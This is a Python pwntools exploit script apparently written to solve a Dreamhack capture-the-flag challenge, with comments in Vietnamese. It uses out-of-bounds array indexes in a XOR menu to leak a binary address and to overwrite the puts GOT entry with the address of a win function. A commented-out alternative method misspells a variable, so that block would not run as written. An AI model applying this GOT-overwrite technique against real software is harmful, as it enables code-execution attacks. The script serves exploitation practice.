#!/usr/bin/env python3
import sys
from pwn import *

context.binary =  exe = ELF('./main')
p = process()
#p = remote('Host3.dreamhack.games', 24545)

def xor(i, j):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', f"{i} {j}".encode())

def print_(i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', f"{i}".encode())
    p.recvuntil(b': ')
    return int(p.recvline().strip(), 16)
def to_binary_string(num):
    binary_string = bin(num)[2:]
    return binary_string

win_offset = exe.symbols['win']
arr_offset = exe.symbols['arr']
dso_handle_offset = exe.symbols['__dso_handle']
puts_offset = exe.got['puts']
gdb.attach(p,gdbscript='''
           b*xor+129           
           ''')
#idx 65 se chua dia chi
dso_handle_idx = (dso_handle_offset - arr_offset) // 8
print("idx: ",dso_handle_idx)
xor(65, dso_handle_idx)

#leak exe
dso_handle_addr = print_(65)
win_addr = dso_handle_addr - dso_handle_offset + win_offset
print(f"__dso_handle: {dso_handle_addr:x}")
print(f"win: {win_addr:x}")

#idx 64 se chua dia chi
puts_idx = (puts_offset - arr_offset) // 8
xor(64, puts_idx)

# cach 1 , xor tung bit cua win voi got puts -> idx64: gia tri cua 2 thang do xor voi nhau
input()
for i in range(64):
    if (win_addr >> i) & 1:
        xor(64, i)
xor(puts_idx, 64)

#cach 2 : 
#xor(66, -16)
#print_(66)
#p.recvuntil(b'Value: ')
#printf = int((b'0x' + p.recvuntil(b'\n')[:-1]).decode(),16)
#taget = to_binary_string(win_addr ^ printf)  #o day ta leak dc thang got nao thi xai thang do , co the la puts , blabla
#print("taget: ",taget)

#for i in range(len(taget)):
#    if target[::-1][i] == '1':          #lay tung bit xor 
#        xor(66,i)
# sau khi xor xong thi idx 66 dua result cua win va printf
#xor(-16,66)


p.interactive()
